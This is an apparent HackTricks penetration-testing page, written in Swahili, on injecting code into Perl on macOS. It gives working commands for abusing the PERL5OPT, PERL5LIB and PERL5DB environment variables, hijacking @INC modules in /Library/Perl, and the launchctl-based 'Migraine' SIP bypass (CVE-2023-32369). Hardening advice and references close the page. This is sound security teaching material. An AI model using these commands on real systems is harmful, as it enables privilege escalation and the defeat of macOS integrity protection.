# Uingizaji wa Perl Applications kwenye macOS

{{#include ../../../banners/hacktricks-training.md}}

## Kupitia env variable za `PERL5OPT` na `PERL5LIB`

Kwa kutumia env variable **`PERL5OPT`**, inawezekana kuifanya **Perl** itekeleze amri kiholela interpreter inapoanza (hata **kabla** mstari wa kwanza wa target script haujaparsiwa).
Kwa mfano, tengeneza script hii:
```perl:test.pl
#!/usr/bin/perl
print "Hello from the Perl script!\n";
```
Sasa **export env variable** na execute **perl** script:
```bash
export PERL5OPT='-Mwarnings;system("whoami")'
perl test.pl # This will execute "whoami"
```
Chaguo jingine ni kuunda module ya Perl (kwa mfano, `/tmp/pmod.pm`):
```perl:/tmp/pmod.pm
#!/usr/bin/perl
package pmod;
system('whoami');
1; # Modules must return a true value
```
Kisha tumia env variables ili module ipatikane na ipakuliwe kiotomatiki:
```bash
PERL5LIB=/tmp/ PERL5OPT=-Mpmod perl victim.pl
```
### Vigezo vingine vya kuvutia vya mazingira

- **`PERL5DB`** – interpreter inapoanzishwa kwa flag ya **`-d`** (debugger), maudhui ya `PERL5DB` hutekelezwa kama Perl code *ndani* ya muktadha wa debugger.
Ikiwa unaweza kudhibiti mazingira na command-line flags za Perl process yenye privileged, unaweza kufanya hivi:

```bash
export PERL5DB='system("/bin/zsh")'
sudo perl -d /usr/bin/some_admin_script.pl   # will drop a shell before executing the script
```

- **`PERL5SHELL`** – kwenye Windows, variable hii hudhibiti shell executable ambayo Perl itatumia inapohitaji kuanzisha shell. Imetajwa hapa kwa ukamilifu tu, kwa kuwa haihusiki na macOS.

Ingawa `PERL5DB` inahitaji switch ya `-d`, ni kawaida kukuta maintenance au installer scripts zinazoendeshwa kama *root* zikiwa na flag hii imewezeshwa kwa ajili ya verbose troubleshooting, hivyo variable hii inaweza kutumika kama escalation vector.

## Kupitia dependencies (@INC abuse)

Inawezekana kuorodhesha include path ambayo Perl itatafuta (**`@INC`**) kwa kuendesha:
```bash
perl -e 'print join("\n", @INC)'
```
Output ya kawaida kwenye macOS 13/14 huonekana hivi:
```bash
/Library/Perl/5.30/darwin-thread-multi-2level
/Library/Perl/5.30
/Network/Library/Perl/5.30/darwin-thread-multi-2level
/Network/Library/Perl/5.30
/Library/Perl/Updates/5.30.3
/System/Library/Perl/5.30/darwin-thread-multi-2level
/System/Library/Perl/5.30
/System/Library/Perl/Extras/5.30/darwin-thread-multi-2level
/System/Library/Perl/Extras/5.30
```
Baadhi ya folda zilizorejeshwa hata hazipo, hata hivyo **`/Library/Perl/5.30`** ipo, *hailindwi* na SIP na iko *kabla* ya folda zinazolindwa na SIP. Kwa hivyo, ikiwa unaweza kuandika ukiwa kama *root* unaweza kuweka module hasidi (mfano `File/Basename.pm`) ambayo itapakiwa kwa *kipaumbele* na script yoyote yenye privileged inayo-import module hiyo.

> [!WARNING]
> Bado unahitaji **root** ili kuandika ndani ya `/Library/Perl` na macOS itaonyesha ujumbe wa **TCC** unaoomba *Full Disk Access* kwa process inayotekeleza operesheni ya kuandika.

Kwa mfano, ikiwa script ina-import **`use File::Basename;`** itawezekana kuunda `/Library/Perl/5.30/File/Basename.pm` yenye code inayodhibitiwa na attacker.

## SIP bypass kupitia Migration Assistant (CVE-2023-32369 “Migraine”)

Mnamo Mei 2023 Microsoft ilifichua **CVE-2023-32369**, iliyopewa jina la utani **Migraine**, mbinu ya post-exploitation inayomruhusu attacker aliye na *root* **kukwepa kabisa System Integrity Protection (SIP)**.
Component iliyo hatarini ni **`systemmigrationd`**, daemon yenye entitlement ya **`com.apple.rootless.install.heritable`**. Process yoyote child inayozalishwa na daemon hii hurithi entitlement hiyo na kwa hivyo huendeshwa **nje ya** vikwazo vya SIP.<sup>[[1]](#references)</sup>

Miongoni mwa children waliotambuliwa na watafiti ni interpreter aliyesainiwa na Apple:<sup>[[1]](#references)</sup>
```
/usr/bin/perl /usr/libexec/migrateLocalKDC …
```
Kwa sababu Perl inaheshimu `PERL5OPT` (na Bash inaheshimu `BASH_ENV`), kuchafua *environment* ya daemon kunatosha kupata utekelezaji wa amri kiholela katika muktadha usio na SIP:<sup>[[1]](#references)[[2]](#references)</sup>
```bash
# As root
launchctl setenv PERL5OPT '-Mwarnings;system("/private/tmp/migraine.sh")'

# Trigger a migration (or just wait – systemmigrationd will eventually spawn perl)
open -a "Migration Assistant.app"   # or programmatically invoke /System/Library/PrivateFrameworks/SystemMigration.framework/Resources/MigrationUtility
```
Wakati `migrateLocalKDC` inaendeshwa, `/usr/bin/perl` huanza ikiwa na `PERL5OPT` yenye madhara na kutekeleza `/private/tmp/migraine.sh` *kabla SIP haijawezeshwa tena*. Kutoka kwenye script hiyo, unaweza, kwa mfano, kunakili payload ndani ya **`/System/Library/LaunchDaemons`** au kuweka extended attribute ya `com.apple.rootless` ili kufanya faili **lishindwe kufutwa**.

Apple ilirekebisha tatizo hili katika macOS **Ventura 13.4**, **Monterey 12.6.6** na **Big Sur 11.7.7**, lakini mifumo ya zamani au ambayo haijafanyiwa patch bado inaweza kuathirika.<sup>[[1]](#references)</sup>

## Mapendekezo ya hardening

1. **Futa variables hatari** – launchdaemons zenye privileges au cron jobs zinapaswa kuanza na environment safi (`launchctl unsetenv PERL5OPT`, `env -i`, n.k.).
2. **Epuka kuendesha interpreters kama root** isipokuwa inapohitajika kabisa. Tumia compiled binaries au punguza privileges mapema.
3. **Tumia vendor scripts zenye `-T` (taint mode)** ili Perl ipuuze `PERL5OPT` na switches nyingine zisizo salama wakati taint checking imewezeshwa.
4. **Weka macOS ikiwa imepata updates** – “Migraine” imerekebishwa kikamilifu katika releases za sasa.

## Marejeo

- [1] [Microsoft Security Blog – Athari mpya ya macOS, Migraine, inaweza kukwepa System Integrity Protection (CVE-2023-32369)](https://www.microsoft.com/en-us/security/blog/2023/05/30/new-macos-vulnerability-migraine-could-bypass-system-integrity-protection/)
- [2] [Hackyboiz – macOS: Sehemu ya 1 - SIP Bypass](https://hackyboiz.github.io/2025/05/11/clalxk/MacOS_SIP-Bypass_en/)

{{#include ../../../banners/hacktricks-training.md}}
